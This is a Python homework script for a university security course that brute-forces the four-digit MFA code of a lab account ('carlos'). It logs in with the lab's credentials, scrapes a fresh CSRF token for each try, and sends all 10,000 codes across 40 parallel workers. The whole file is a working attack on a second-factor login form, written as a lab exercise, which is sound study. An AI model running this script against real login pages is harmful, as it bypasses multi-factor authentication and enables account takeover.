# hw1.py -- Written by Andrew Stevenson on 4/17/21 for CS 595 at PSU.
# Checks all possible 4-digit codes to find the correct PIN for account name carlos.
# Accepts a token as a command line parameter indicating which site to run the test against.

import requests
import sys
from bs4 import BeautifulSoup
import multiprocessing
import traceback

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')


def try_code(csrf, code, s):
    """Attempts to authenticate with session s to the PIN form. Side effect: prints out PIN if successfully
    authenticated.
    :param csrf: The csrf code to use for the attempt
    :param code: The PIN candidate to use for the attempt
    :param s: The session object through which to make the attempt
    :return: The HTTP code returned by the PIN entry form.
    """
    login2_url = f'https://{site}/login2'
    login2data = {
        'csrf': csrf,
        'mfa-code': str(code).zfill(4)
    }
    resp = s.post(login2_url, data=login2data, allow_redirects=False)
    if resp.status_code == 302:
        print(f"PIN is {login2data['mfa-code']}")
    return resp.status_code


def get_csrf(s):
    """Retrieves a valid CSRF code using the credentials carlos : montoya
    :param s: The session object through which to authenticate
    :return: The csrf code delivered by the form
    """
    login_url = f'https://{site}/login'
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')
    logindata = {
        'csrf': csrf,
        'username': 'carlos',
        'password': 'montoya'
    }
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text, 'html.parser')
    return soup.find('input', {'name': 'csrf'}).get('value')


def dispatch_requests(arg):
    """ Dispatch the requests necessary to test a single PIN candidate
    :param arg: List of the form [code, session] where code is the PIN candidate to test and session is the session
    object through which to make the attempt.
    :return: The http code of the response from the PIN form.
    """
    try:
        csrf = get_csrf(arg[1])
        return try_code(csrf, arg[0], arg[1])
    except Exception as e:
        print(f'Caught exception in worker thread while processing {arg}')
        traceback.print_exc()
        print()
        raise e


if __name__ == '__main__':
    try:
        s = requests.Session()
        p = multiprocessing.Pool(40)
        processing = [x for x in range(10000)]
        results = p.imap(dispatch_requests, [[x, s] for x in processing])
        for x in results:
            if x == 302:
                exit()
        p.close()
        p.join()
        if 302 not in results:
            print("Sorry, PIN not found.")
    except Exception as e:
        traceback.print_exc()
        print()
        exit()

